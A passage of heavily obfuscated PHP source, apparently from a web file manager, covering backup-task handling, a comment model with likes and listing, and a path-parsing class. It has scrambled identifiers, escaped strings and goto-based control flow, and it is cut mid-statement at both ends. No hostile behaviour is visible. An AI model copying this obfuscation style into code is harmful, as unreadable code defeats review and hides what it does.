Model($B×¨ãÌŞõ˜[1092])->get($B×¨ãÌŞõ˜[717]); $f”–Ş—•‹Õ = json_decode($f”–Ş—•‹Õ, !0); goto A÷ù¾ÄŸ¦ô; Bß÷àÎŠ: if (isset($Cí´¨£‘ß[$B×¨ãÌŞõ˜[190]])) { $Cí´¨£‘ß[$B×¨ãÌŞõ˜[190]] = json_decode($Cí´¨£‘ß[$B×¨ãÌŞõ˜[190]], !0); } if (isset($f”–Ş—•‹Õ[$B×¨ãÌŞõ˜[190]])) { $Cí´¨£‘ß[$B×¨ãÌŞõ˜[190]][$B×¨ãÌŞõ˜[1420]] = $f”–Ş—•‹Õ[$B×¨ãÌŞõ˜[190]]; unset($f”–Ş—•‹Õ[$B×¨ãÌŞõ˜[190]]); } return array_merge($Cí´¨£‘ß, $f”–Ş—•‹Õ); goto E¨©í¿ãÙÄ; AëÕä°÷Êê: Action($B×¨ãÌŞõ˜[2135])->taskInit(); $Fßšğ¬ŒÜÅ = Model($B×¨ãÌŞõ˜[2136])->listData(); foreach ($Fßšğ¬ŒÜÅ as $Càä³éŒÙÒ) { if ($Càä³éŒÙÒ[$B×¨ãÌŞõ˜[1084]] == $B×¨ãÌŞõ˜[83] && $Càä³éŒÙÒ[$B×¨ãÌŞõ˜[1433]] == $B×¨ãÌŞõ˜[2137]) { $Cí´¨£‘ß = $Càä³éŒÙÒ; break; } } goto Bß÷àÎŠ; E¨©í¿ãÙÄ: } public function listData($dÈîˆõŒ’ = false, $b¥ß¤„ÖÜà = "\155\157\x64\151\146\171\124\x69\155\145", $c‰±ìŞ„ ± = false) { return parent::listData($dÈîˆõŒ’, $b¥ß¤„ÖÜà, !0); } public function lastItem() { $fƒåğçñ˜ø = $this->listData(); return !empty($fƒåğçñ˜ø[0]) ? $fƒåğçñ˜ø[0] : null; } public function kill($cÙÇšºäÇ”) { goto döÊŒÆ·©ó; döÊŒÆ·©ó: $bñÖ²¥¢Ä„ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $a—×òÒÊ‘ = $this->listData($cÙÇšºäÇ”); if (!$a—×òÒÊ‘ || empty($a—×òÒÊ‘[$bñÖ²¥¢Ä„[28]])) { return !0; } goto F¡ŒŠõÅ“; fïóèñÚ¨í: $B¦×£¼©£ = $a—×òÒÊ‘[$bñÖ²¥¢Ä„[28]]; $fŠóÆÎ¥‹Î = TEMP_FILES . $bñÖ²¥¢Ä„[713] . $B¦×£¼©£ . $bñÖ²¥¢Ä„[8]; IO::remove($fŠóÆÎ¥‹Î, !1); goto FĞñ÷ñ“ğŒ; F¡ŒŠõÅ“: Task::kill($bñÖ²¥¢Ä„[716]); Task::kill($bñÖ²¥¢Ä„[732]); Task::kill($bñÖ²¥¢Ä„[740]); goto fïóèñÚ¨í; FĞñ÷ñ“ğŒ: return $this->remove($cÙÇšºäÇ”); goto D‡ôó›¥‰Ş; D‡ôó›¥‰Ş: } public function remove($B »˜‡Â‚ƒ) { $D•é Êà‹¥ = $this->listData($B »˜‡Â‚ƒ); if (!$D•é Êà‹¥) { return !0; } return $this->backupRemove($D•é Êà‹¥); } private function backupRemove($c‘±áèŸÜ) { $c¹ˆˆèé‰÷ =& $_SERVER[³‘’¼äÑ™ÔÍ]; parent::remove($c‘±áèŸÜ[$c¹ˆˆèé‰÷[367]]); $FŒÜô¹¾˜ = "\173\x69\x6f\x3a{$c‘±áèŸÜ[$c¹ˆˆèé‰÷[694]]}\175\x2f\x64\x61\164\x61\142\141\163\145\57\x62\x61\x63\x6b\x75\x70\137" . $c‘±áèŸÜ[$c¹ˆˆèé‰÷[28]]; IO::remove($FŒÜô¹¾˜, !1); return !0; } public function start() { goto b§Å«Òì³Œ; cº¾‡àé: if (!$fÀÉÅ‰ÉÔ->dbFile()) { return !1; } if ($d…‹ºîÆƒ[$fÄ¦×ù¼°¥[695]] == $fÄ¦×ù¼°¥[468]) { $fÀÉÅ‰ÉÔ->file(); } Backup::set(array($fÄ¦×ù¼°¥[692] => 1, $fÄ¦×ù¼°¥[706] => time())); goto C‡åéÆÑ¡¿; FÈ½®¤·‚ë: if (!$d…‹ºîÆƒ || $d…‹ºîÆƒ[$fÄ¦×ù¼°¥[1417]] != $fÄ¦×ù¼°¥[83]) { return !1; } $eÚõ¥Ãô¹á = $this->process(); foreach ($eÚõ¥Ãô¹á as $BÑ‘·¹‹È) { if ($BÑ‘·¹‹È) { return Task::restart($BÑ‘·¹‹È[$fÄ¦×ù¼°¥[367]]); } } goto fèø‡å£; C‡åéÆÑ¡¿: return !0; goto fŸ£æİšÅ; fèø‡å£: $fÀÉÅ‰ÉÔ = new Backup(); $fÀÉÅ‰ÉÔ->keep(); if (!$fÀÉÅ‰ÉÔ->db()) { return !1; } goto cº¾‡àé; b§Å«Òì³Œ: $fÄ¦×ù¼°¥ =& $_SERVER[³‘’¼äÑ™ÔÍ]; if ($GLOBALS[$fÄ¦×ù¼°¥[6]][$fÄ¦×ù¼°¥[84]][$fÄ¦×ù¼°¥[2138]] != $fÄ¦×ù¼°¥[83]) { return !0; } $d…‹ºîÆƒ = $this->config(); goto FÈ½®¤·‚ë; fŸ£æİšÅ: } public function process() { $DëŸËŠ =& $_SERVER[³‘’¼äÑ™ÔÍ]; return array($DëŸËŠ[697] => Task::get($DëŸËŠ[716]), $DëŸËŠ[700] => Task::get($DëŸËŠ[732]), $DëŸËŠ[167] => Task::get($DëŸËŠ[740])); } public function restore() { $Fˆ¼©†óÓÀ =& $_SERVER[³‘’¼äÑ™ÔÍ]; ActionCall($Fˆ¼©†óÓÀ[2139], !0, 1); ActionCall($Fˆ¼©†óÓÀ[2139], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\x63\157\x6d\155\145\156\164"; protected $tableMeta = array("\164\x61\x62\154\x65\116\141\x6d\145" => "\143\157\x6d\155\x65\156\164\137\x6d\145\x74\141", "\155\x65\164\141\x46\x69\x65\x6c\x64" => "\x63\157\155\155\x65\x6e\x74\x49\x44"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($ašèÆ¨ÍÓ) { $fçùôš¢¡ =& $_SERVER[³‘’¼äÑ™ÔÍ]; if ($ašèÆ¨ÍÓ[$fçùôš¢¡[2140]]) { $CŒõùñÛã‰ = $this->where(array($fçùôš¢¡[2141] => $ašèÆ¨ÍÓ[$fçùôš¢¡[2140]]))->find(); if (!$CŒõùñÛã‰ || $CŒõùñÛã‰[$fçùôš¢¡[371]] != $ašèÆ¨ÍÓ[$fçùôš¢¡[371]] || $CŒõùñÛã‰[$fçùôš¢¡[456]] != $ašèÆ¨ÍÓ[$fçùôš¢¡[456]]) { return !1; } $this->where(array($fçùôš¢¡[2141] => $ašèÆ¨ÍÓ[$fçùôš¢¡[2140]]))->setAdd($fçùôš¢¡[2142], 1); } return $this->add($ašèÆ¨ÍÓ); } public function remove($CÓªäƒí¢•) { $C«â«ˆ••È =& $_SERVER[³‘’¼äÑ™ÔÍ]; $bÎÁ¦ªœ£Ì = array($C«â«ˆ••È[2141] => $CÓªäƒí¢•); $c¼®­íÓ’ = $this->where($bÎÁ¦ªœ£Ì)->find(); if ($c¼®­íÓ’[$C«â«ˆ••È[2140]]) { $this->where(array($C«â«ˆ••È[2141] => $c¼®­íÓ’[$C«â«ˆ••È[2140]]))->setAdd($C«â«ˆ••È[2142], -1); } return $this->where($bÎÁ¦ªœ£Ì)->delete(); } public function edit($Aº»ÊË¾ ø, $e‚¼öÇöÚê) { $C–Ò—Ùô =& $_SERVER[³‘’¼äÑ™ÔÍ]; $d¢¥‡ô©çß = array($C–Ò—Ùô[2141] => $Aº»ÊË¾ ø); return $this->where($d¢¥‡ô©çß)->save(array($C–Ò—Ùô[2143] => $e‚¼öÇöÚê)); } public function prasise($dµ‰“Áóôù) { $A‘ƒ×‡ò¦Ğ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $E ñãÜ‰—„ = Model($A‘ƒ×‡ò¦Ğ[2144]); $e¨†·”Åİ = array($A‘ƒ×‡ò¦Ğ[2141] => $dµ‰“Áóôù, $A‘ƒ×‡ò¦Ğ[1436] => USER_ID); $A‡Ä‰¾“æÂ = $E ñãÜ‰—„->where($e¨†·”Åİ)->find(); if (!$A‡Ä‰¾“æÂ) { $E ñãÜ‰—„->add($e¨†·”Åİ); $BãğÖ½¯»Â = $this->where(array($A‘ƒ×‡ò¦Ğ[2141] => $dµ‰“Áóôù))->setAdd($A‘ƒ×‡ò¦Ğ[2145], 1); } else { $E ñãÜ‰—„->where($e¨†·”Åİ)->delete(); $BãğÖ½¯»Â = $this->where(array($A‘ƒ×‡ò¦Ğ[2141] => $dµ‰“Áóôù))->setAdd($A‘ƒ×‡ò¦Ğ[2145], -1); } return $BãğÖ½¯»Â; } public function targetInfo($Aë‘±”É , $aæëÇŸÈ…È) { goto Aê¨¾ªÌË„; e‡Ğî’‰ë: $dÉ±À¢Üˆ× = "\x52\x49\x47\x48\x54\40\112\x4f\111\x4e\40{$this->tablePrefix}\x63\x6f\x6d\155\145\x6e\164\137\160\162\x61\151\x73\145\40\163\164\x61\162\x20\157\x6e\40\x63\x6f\x6d\x6d\145\156\164\x2e\143\x6f\155\155\145\156\x74\111\x44\40\x3d\x20\163\164\141\x72\56\x63\x6f\x6d\x6d\x65\x6e\x74\111\x44"; $Fá’ğ†›ÓÊ = $this->alias($FßÃÆ‰²[341])->where($CÜ„ÇÆÕÍ)->join($dÉ±À¢Üˆ×, $FßÃÆ‰²[2146])->count(); $FºšÆ‰Üì¼ = array($FßÃÆ‰²[2147] => $DŸ³¿«²ö², $FßÃÆ‰²[2148] => $Fá’ğ†›ÓÊ); goto D“‡ˆÉ®İ; Aê¨¾ªÌË„: $FßÃÆ‰² =& $_SERVER[³‘’¼äÑ™ÔÍ]; $CÜ„ÇÆÕÍ = array($FßÃÆ‰²[521] => $Aë‘±”É , $FßÃÆ‰²[522] => $aæëÇŸÈ…È); $DŸ³¿«²ö² = $this->where($CÜ„ÇÆÕÍ)->count(); goto e‡Ğî’‰ë; D“‡ˆÉ®İ: return $FºšÆ‰Üì¼; goto eÓ¾¨Ûøé; eÓ¾¨Ûøé: } public function listData($A§‚¯¶—Ä) { $D±ò­×õ‰ =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (isset($A§‚¯¶—Ä[$D±ò­×õ‰[2149]])) { if ($A§‚¯¶—Ä[$D±ò­×õ‰[2149]]) { $A§‚¯¶—Ä[$D±ò­×õ‰[2150]] = array($D±ò­×õ‰[932], intval($A§‚¯¶—Ä[$D±ò­×õ‰[2149]])); } unset($A§‚¯¶—Ä[$D±ò­×õ‰[2149]]); } if (isset($A§‚¯¶—Ä[$D±ò­×õ‰[2151]])) { if ($A§‚¯¶—Ä[$D±ò­×õ‰[2151]]) { $A§‚¯¶—Ä[$D±ò­×õ‰[2150]] = array($D±ò­×õ‰[929], intval($A§‚¯¶—Ä[$D±ò­×õ‰[2151]])); } unset($A§‚¯¶—Ä[$D±ò­×õ‰[2151]]); } return $this->_listData($A§‚¯¶—Ä); } private function _listData($dÈå‘¦Õñæ) { $Föí½Á§·´ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $CåÂ’‘ÈÇ… = $this->where($dÈå‘¦Õñæ)->_makeOrder()->selectPage(100); $this->_listAppendParent($CåÂ’‘ÈÇ…[$Föí½Á§·´[354]]); $this->_listAppendUser($CåÂ’‘ÈÇ…[$Föí½Á§·´[354]]); $this->_listAppendMeta($CåÂ’‘ÈÇ…[$Föí½Á§·´[354]]); return $CåÂ’‘ÈÇ…; } private function _makeOrder() { $c‡à³èµÁÂ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $B…£èàÊ×‹ = array($c‡à³èµÁÂ[2145], $c‡à³èµÁÂ[2142], $c‡à³èµÁÂ[187]); $eæˆ‡ªºÃ = Input::get($c‡à³èµÁÂ[407], $c‡à³èµÁÂ[7], $c‡à³èµÁÂ[389], $B…£èàÊ×‹); $dØÆßÛ­·á = Input::get($c‡à³èµÁÂ[408], $c‡à³èµÁÂ[7], $c‡à³èµÁÂ[1438], array($c‡à³èµÁÂ[2152], $c‡à³èµÁÂ[405])); $d…¬Æƒ‘¬· = $eæˆ‡ªºÃ . $c‡à³èµÁÂ[50] . $dØÆßÛ­·á; return $this->order($d…¬Æƒ‘¬·); } private function _listAppendParent(&$eƒ¬¬à‹’–) { goto Fµã®½íÃ; b¦´åå‘ñ: if (!$fçÏÈ»Ÿá›) { return; } $dèß¶ÔŸòå = $this->where(array($aÜ•™Çåå[2141] => array($aÜ•™Çåå[7], $fçÏÈ»Ÿá›)))->select(); $dèß¶ÔŸòå = array_to_keyvalue($dèß¶ÔŸòå, $aÜ•™Çåå[2150]); goto d’Ğİ¨î´ô; d’Ğİ¨î´ô: foreach ($eƒ¬¬à‹’– as &$FØÔ‘Ì¸Ğ°) { if (isset($dèß¶ÔŸòå[$FØÔ‘Ì¸Ğ°[$aÜ•™Çåå[2140]]])) { $FØÔ‘Ì¸Ğ°[$aÜ•™Çåå[2153]] = $dèß¶ÔŸòå[$FØÔ‘Ì¸Ğ°[$aÜ•™Çåå[2140]]]; } } goto C³ğêËÅ‹¹; Fµã®½íÃ: $aÜ•™Çåå =& $_SERVER[³‘’¼äÑ™ÔÍ]; $fçÏÈ»Ÿá› = array_unique(array_to_keyvalue($eƒ¬¬à‹’–, $aÜ•™Çåå[33], $aÜ•™Çåå[2140])); $fçÏÈ»Ÿá› = array_remove_value($fçÏÈ»Ÿá›, $aÜ•™Çåå[468]); goto b¦´åå‘ñ; C³ğêËÅ‹¹: } private function _listAppendUser(&$B‰ªÅ†Ú–ä) { goto fó½ íê¬Ó; fó½ íê¬Ó: $E²íÎèÕ…ù =& $_SERVER[³‘’¼äÑ™ÔÍ]; $fœ‹Ì‡ÕŠ„ = array_unique(array_to_keyvalue($B‰ªÅ†Ú–ä, $E²íÎèÕ…ù[33], $E²íÎèÕ…ù[1445])); $fœ‹Ì‡ÕŠ„ = array_remove_value($fœ‹Ì‡ÕŠ„, $E²íÎèÕ…ù[468]); goto dğÉŠî¶´ô; AÔ ÷–›: foreach ($B‰ªÅ†Ú–ä as &$d·ò÷…”‰) { $d·ò÷…”‰[$E²íÎèÕ…ù[535]] = $FÌÒİ“óåÊ[$d·ò÷…”‰[$E²íÎèÕ…ù[1445]]]; if (isset($d·ò÷…”‰[$E²íÎèÕ…ù[2153]])) { $d·ò÷…”‰[$E²íÎèÕ…ù[2153]][$E²íÎèÕ…ù[535]] = $FÌÒİ“óåÊ[$d·ò÷…”‰[$E²íÎèÕ…ù[2153]][$E²íÎèÕ…ù[1445]]]; } } goto bà•à‘„¡ˆ; dğÉŠî¶´ô: if (count($fœ‹Ì‡ÕŠ„) == 0) { return; } foreach ($B‰ªÅ†Ú–ä as $d·ò÷…”‰) { if (isset($d·ò÷…”‰[$E²íÎèÕ…ù[2153]])) { $fœ‹Ì‡ÕŠ„[] = $d·ò÷…”‰[$E²íÎèÕ…ù[2153]][$E²íÎèÕ…ù[1445]]; } } $FÌÒİ“óåÊ = Model($E²íÎèÕ…ù[477])->userListInfo($fœ‹Ì‡ÕŠ„); goto AÔ ÷–›; bà•à‘„¡ˆ: } private function _listAppendMeta(&$c­¸áù„±ç) { goto e†â…ïø°; A¥î‚Òµ²•: if (!$f§ÓºÇÇá) { return; } foreach ($c­¸áù„±ç as $C‡‰öõÒˆŞ) { if (isset($C‡‰öõÒˆŞ[$cæ­Í ò¢£[2153]])) { $f§ÓºÇÇá[] = $C‡‰öõÒˆŞ[$cæ­Í ò¢£[2153]][$cæ­Í ò¢£[2150]]; } } $Aƒ­ÉÁ÷¶ = $this->metaList($f§ÓºÇÇá); goto b£¬Ä‰¢Ø; e†â…ïø°: $cæ­Í ò¢£ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $f§ÓºÇÇá = array_unique(array_to_keyvalue($c­¸áù„±ç, $cæ­Í ò¢£[33], $cæ­Í ò¢£[2150])); $f§ÓºÇÇá = array_remove_value($f§ÓºÇÇá, $cæ­Í ò¢£[468]); goto A¥î‚Òµ²•; b£¬Ä‰¢Ø: if (!$Aƒ­ÉÁ÷¶) { return !1; } foreach ($c­¸áù„±ç as &$C‡‰öõÒˆŞ) { $C‡‰öõÒˆŞ[$cæ­Í ò¢£[417]] = $Aƒ­ÉÁ÷¶[$C‡‰öõÒˆŞ[$cæ­Í ò¢£[2150]]]; if (isset($C‡‰öõÒˆŞ[$cæ­Í ò¢£[2153]])) { $C‡‰öõÒˆŞ[$cæ­Í ò¢£[2153]][$cæ­Í ò¢£[417]] = $Aƒ­ÉÁ÷¶[$C‡‰öõÒˆŞ[$cæ­Í ò¢£[2153]][$cæ­Í ò¢£[2150]]]; } } goto DÌ£ØÅá¿Ä; DÌ£ØÅá¿Ä: } private function metaList($F©˜¬Üƒ·‚) { goto cñ•·õ£”½; cñ•·õ£”½: $E„–­Šª† =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (!$F©˜¬Üƒ·‚) { return array(); } $A¾œÌå¼ = array($E„–­Šª†[2150] => array($E„–­Šª†[7], $F©˜¬Üƒ·‚)); goto b¿­Úàğ—Ò; b¿­Úàğ—Ò: $c‹ŸÌáõø = Model($E„–­Šª†[2154])->where($A¾œÌå¼)->select(); $c‹ŸÌáõø = array_to_keyvalue_group($c‹ŸÌáõø, $E„–­Šª†[2150]); foreach ($c‹ŸÌáõø as $Dêğ´„çé‡ => $Bí«¡£ã˜) { $bš½Ê±Ì¬ = array(); foreach ($Bí«¡£ã˜ as $déé›çñ) { $bš½Ê±Ì¬[$déé›çñ[$E„–­Šª†[89]]] = $déé›çñ[$E„–­Šª†[359]]; } $c‹ŸÌáõø[$Dêğ´„çé‡] = $bš½Ê±Ì¬; } goto A‹š«Ÿ»‰; A‹š«Ÿ»‰: return $c‹ŸÌáõø ? $c‹ŸÌáõø : array(); goto E¢ƒÃØÎ‘ø; E¢ƒÃØÎ‘ø: } } goto A×Š´ğƒ³å; Fì…½¹ÛìŸ: class KodIO { const KOD_SOURCE = "\x7b\163\157\x75\x72\143\145\175"; const KOD_USER_RECYCLE = "\x7b\x75\x73\145\x72\122\x65\x63\171\x63\154\x65\x7d"; const KOD_USER_FAV = "\x7b\165\x73\x65\x72\106\141\166\175"; const KOD_USER_FILE_TAG = "\x7b\165\163\145\162\106\x69\154\145\x54\x61\x67\x7d"; const KOD_USER_FILE_TYPE = "\173\165\x73\145\x72\106\x69\154\x65\x54\x79\160\x65\175"; const KOD_GROUP_ROOT_SELF = "\173\x67\162\157\165\x70\122\x6f\x6f\164\123\145\x6c\146\x7d"; const KOD_USER_SHARE = "\x7b\x75\163\145\x72\123\x68\x61\x72\145\x7d"; const KOD_USER_SHARE_LINK = "\173\165\163\145\x72\123\150\x61\162\145\114\x69\156\x6b\x7d"; const KOD_USER_SHARE_TO_ME = "\173\163\150\x61\162\x65\x54\x6f\x4d\x65\x7d"; const KOD_SHARE_ITEM = "\173\163\150\141\162\145\x49\x74\145\x6d\x7d"; const KOD_SHARE_LINK = "\x7b\163\150\x61\162\x65\x49\164\145\155\x4c\x69\x6e\x6b\175"; const KOD_SEARCH = "\173\163\145\141\162\x63\150\x7d"; const KOD_BLOCK = "\173\142\x6c\157\x63\153\x7d"; const KOD_IO = "\173\151\157\175"; const KOD_USER_RECENT = "\x7b\165\x73\x65\162\122\145\156\143\145\156\x74\x7d"; const KOD_USER_DRIVER = "\173\x64\162\x69\x76\x65\x72\x7d"; public static function typeList() { $DÂÀçæíê =& $_SERVER[³‘’¼äÑ™ÔÍ]; return array($DÂÀçæíê[1054] => self::KOD_SOURCE, $DÂÀçæíê[1055] => self::KOD_USER_RECYCLE, $DÂÀçæíê[1056] => self::KOD_USER_FAV, $DÂÀçæíê[1057] => self::KOD_USER_FILE_TAG, $DÂÀçæíê[1058] => self::KOD_USER_FILE_TYPE, $DÂÀçæíê[1059] => self::KOD_GROUP_ROOT_SELF, $DÂÀçæíê[1060] => self::KOD_USER_SHARE, $DÂÀçæíê[1061] => self::KOD_USER_SHARE_LINK, $DÂÀçæíê[1062] => self::KOD_USER_SHARE_TO_ME, $DÂÀçæíê[1063] => self::KOD_SHARE_ITEM, $DÂÀçæíê[1064] => self::KOD_SHARE_LINK, $DÂÀçæíê[1065] => self::KOD_SEARCH, $DÂÀçæíê[1066] => self::KOD_BLOCK, $DÂÀçæíê[1067] => self::KOD_IO, $DÂÀçæíê[1068] => self::KOD_USER_RECENT, $DÂÀçæíê[1069] => self::KOD_USER_DRIVER); } public static function parse($e®£…ç”¯) { goto D°‹Âñ†÷İ; D°‹Âñ†÷İ: $aÑèÓãî¢ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $e®£…ç”¯ = self::clear($e®£…ç”¯); $ašóÉ¢ÍÔÑ = array_values(self::typeList()); goto AÇÎà•ÑâÅ; aÖœç†Î°‚: $FĞ–Å‚¼Œ‹ = array($aÑèÓãî¢[33], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $EÒ™Ø…¹ŞÜ[$aÑèÓãî¢[1074]] = in_array($EÒ™Ø…¹ŞÜ[$aÑèÓãî¢[29]], $FĞ–Å‚¼Œ‹); return $EÒ™Ø…¹ŞÜ; goto EØé´œµ×¬; AÇÎà•ÑâÅ: preg_match($aÑèÓãî¢[1070], $e®£…ç”¯, $F¶ã†éİç); $EÒ™Ø…¹ŞÜ = array($aÑèÓãî¢[388] => !1, $aÑèÓãî¢[1071] => !1, $aÑèÓãî¢[385] => !1, $aÑèÓãî¢[75] => $e®£…ç”¯, $aÑèÓãî¢[1017] => !1, $aÑèÓãî¢[1016] => $aÑèÓãî¢[33]); if (is_array($F¶ã†éİç) && count($F¶ã†éİç) == 5) { $CÎŸøÂšÛ¢ = $aÑèÓãî¢[1072] . $F¶ã†éİç[2] . $aÑèÓãî¢[315]; if (in_array($CÎŸøÂšÛ¢, $ašóÉ¢ÍÔÑ)) { $EÒ™Ø…¹ŞÜ[$aÑèÓãî¢[1017]] = $F¶ã†éİç[1]; $EÒ™Ø…¹ŞÜ[$aÑèÓãî¢[29]] = $CÎŸøÂšÛ¢; $EÒ™Ø…¹ŞÜ[$aÑèÓãî¢[1073]] = substr($CÎŸøÂšÛ¢, 1, -1); $EÒ™Ø…¹ŞÜ[$aÑèÓãî¢[367]] = $F¶ã†éİç[3]; } $EÒ™Ø…¹ŞÜ[$aÑèÓãî¢[1016]] = $F¶ã†éİç[4]; } goto aÖœç†Î°‚; EØé´œµ×¬: } public static function clear($aÊÓĞ’§ì) { goto BÙãïæÄ­Û; c¯áŠï±Ÿ: $aÊÓĞ’§ì = preg_replace($bòŒ“ÏÕ¦Á[1077], $bòŒ“ÏÕ¦Á[8], $aÊÓĞ’§ì); if ($aÊÓĞ’§ì == $bòŒ“ÏÕ¦Á[8]) { return $bòŒ“ÏÕ¦Á[8]; } $aÊÓĞ’§ì = rtrim($aÊÓĞ’§ì, $bòŒ“ÏÕ¦Á[8]); goto b”ß†ø‚; BÙãïæÄ­Û: $bòŒ“ÏÕ¦Á =& $_SERVER[³‘’¼äÑ™ÔÍ]; $aÊÓĞ’§ì = str_replace(array($bòŒ“ÏÕ¦Á[996], $bòŒ“ÏÕ¦Á[217]), $bòŒ“ÏÕ¦Á[50], $aÊÓĞ’§ì); $aÊÓĞ’§ì = str_replace($bòŒ“ÏÕ¦Á[93], $bòŒ“ÏÕ¦Á[8], $aÊÓĞ’§ì); goto CßğÊÉø‡; CßğÊÉø‡: $A¿Ë—²‹›Å = $bòŒ“ÏÕ¦Á[1075]; if (substr($aÊÓĞ’§ì, 0, 3) == $bòŒ“ÏÕ¦Á[1076]) { $aÊÓĞ’§ì = substr($aÊÓĞ’§ì, 3); } while (strstr($aÊÓĞ’§ì, $A¿Ë—²‹›Å)) { $aÊÓĞ’§ì = str_replace($A¿Ë—²‹›Å, $bòŒ“ÏÕ¦Á[8], $aÊÓĞ’§ì); } goto c¯áŠï±Ÿ; b”ß†ø‚: return $aÊÓĞ’§ì; goto Cù©ˆîÁ‡²; Cù©ˆîÁ‡²: } public static function sourceID($Aø­Ğ§“ä„) { $DÑˆ¾Û—¸ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $C²çßˆÃë— = self::parse($Aø­Ğ§“ä„); if ($C²çßˆÃë—[$DÑˆ¾Û—¸[29]] !== self::KOD_SOURCE) { show_json(LNG($DÑˆ¾Û—¸[1078]), !1); } return $C²çßˆÃë—[$DÑˆ¾Û—¸[367]]; } public static function make($b¶¥ÂÇÙ) { if (!$b¶¥ÂÇÙ) { return !1; } return self::makePath(self::KOD_SOURCE, intval($b¶¥ÂÇÙ)); } public static function makeShare($B¯‹ó‰„¦Õ, $BÓÌ·íˆÃğ) { return self::makePath(self::KOD_SHARE_ITEM, $B¯‹ó‰„¦Õ, $BÓÌ·íˆÃğ); } public static function makeFileTypePath($E×ù¤¢‡òš) { return self::makePath(self::KOD_USER_FILE_TYPE, $E×ù¤¢‡òš); } public static function makeFileTagPath($eæä×³‘æ) { return self::makePath(self::KOD_USER_FILE_TAG, $eæä×³‘æ); } public static function makePath($eÅÏÖÃÁ², $f¹®¬Ö¦ˆ = '', $dš‡©³Ã•ó = '') { $EÕ¢Ïƒâ”ï =& $_SERVER[³‘’¼äÑ™ÔÍ]; $DÖÛÑˆ¦¼è = substr($eÅÏÖÃÁ², 1, -1); $bä²Û½ÈÉ = $EÕ¢Ïƒâ”ï[1079] . $DÖÛÑˆ¦¼è . $EÕ¢Ïƒâ”ï[1080] . $f¹®¬Ö¦ˆ . $EÕ¢Ïƒâ”ï[1081]; $bä²Û½ÈÉ = $dš‡©³Ã•ó ? $bä²Û½ÈÉ . $dš‡©³Ã•ó . $EÕ¢Ïƒâ”ï[8] : $bä²Û½ÈÉ; return $bä²Û½ÈÉ; } public static function hashPath($AÍª©¶Ç«î) { $eÕ¯Å¿Í«¿ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $FéçùãíùÁ = is_array($AÍª©¶Ç«î) ? $AÍª©¶Ç«î : IO::info($AÍª©¶Ç«î); $døù®¦æè = _get($FéçùãíùÁ, $eÕ¯Å¿Í«¿[1082], $eÕ¯Å¿Í«¿[33]); if (!$døù®¦æè) { $D‚ÂÜØàó = KodIO::parse($FéçùãíùÁ[$eÕ¯Å¿Í«¿[75]]); if (!$D‚ÂÜØàó[$eÕ¯Å¿Í«¿[29]]) { $døù®¦æè = IO::hashSimple($FéçùãíùÁ[$eÕ¯Å¿Í«¿[75]]); } } if (!$døù®¦æè) { $døù®¦æè = md5($FéçùãíùÁ[$eÕ¯Å¿Í«¿[75]] . $FéçùãíùÁ[$eÕ¯Å¿Í«¿[77]] . $FéçùãíùÁ[$eÕ¯Å¿Í«¿[107]]); } return $døù®¦æè; } public static function initSystemPath() { $eÔ·‹ßù‰ =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (defined($eÔ·‹ßù‰[1083])) { return; } define($eÔ·‹ßù‰[1083], self::systemPath($eÔ·‹ßù‰[1084])); define($eÔ·‹ßù‰[1085], self::systemPath($eÔ·‹ßù‰[1086])); define($eÔ·‹ßù‰[1087], self::systemPath($eÔ·‹ßù‰[1088])); define($eÔ·‹ßù‰[1089], self::systemPath($eÔ·‹ßù‰[1090])); } private static function systemPath($E» ßù­) { goto F§µ¡¢»Şğ; F§µ¡¢»Şğ: $eçÂ©‚¢ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $b÷‰‹”¼Ää = $eçÂ©‚¢[1091] . ucfirst($E» ßù­); $EËŞ¡æ°¦¡ = Model($eçÂ©‚¢[1092])->get($b÷‰‹”¼Ää); goto d¥õ·›è³’; eé±ƒ£Ëù‰: return $EËŞ¡æ°¦¡; goto Bøñ¿ÈÉ¥; d¥õ·›è³’: if ($EËŞ¡æ°¦¡) { return $EËŞ¡æ°¦¡; } if ($E» ßù­ == $eçÂ©‚¢[1084]) { $EËŞ¡æ°¦¡ = self::make(Model($eçÂ©‚¢[756])->systemRootPathAdd($eçÂ©‚¢[1093])); } else { $EËŞ¡æ°¦¡ = self::systemPath($eçÂ©‚¢[1084]); $c‡ëÔÒÀ±¬ = self::sourceID($EËŞ¡æ°¦¡); $EËŞ¡æ°¦¡ = self::make(Model($eçÂ©‚¢[756])->mkdir($c‡ëÔÒÀ±¬, $E» ßù­)); } Model($eçÂ©‚¢[1092])->set($b÷‰‹”¼Ää, $EËŞ¡æ°¦¡); goto eé±ƒ£Ëù‰; Bøñ¿ÈÉ¥: } public static function systemFolder($DÍ’†±ğ§) { $B¤®Ç§±éÀ = IO_PATH_SYSTEM_SOURCE . $DÍ’†±ğ§; $b­¹æ¿§”… = Cache::get($B¤®Ç§±éÀ); if (!$b­¹æ¿§”…) { $dÖóéØŸîë = IO::infoFull($B¤®Ç§±éÀ); if (!$dÖóéØŸîë) { $b­¹æ¿§”… = IO::mkdir($B¤®Ç§±éÀ, REPEAT_SKIP); } else { $b­¹æ¿§”… = $dÖóéØŸîë[$_SERVER[³‘’¼äÑ™ÔÍ][75]]; } Cache::set($B¤®Ç§±éÀ, $b­¹æ¿§”…, 3600 * 10); } return $b­¹æ¿§”…; } public static function defaultDriver() { return Model($_SERVER[³‘’¼äÑ™ÔÍ][707])->defaultDriver(); } public static function defaultIO() { $aÓï£Ÿ×ÀÚ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $bĞ³âÕÆ = self::defaultDriver(); return $aÓï£Ÿ×ÀÚ[1094] . 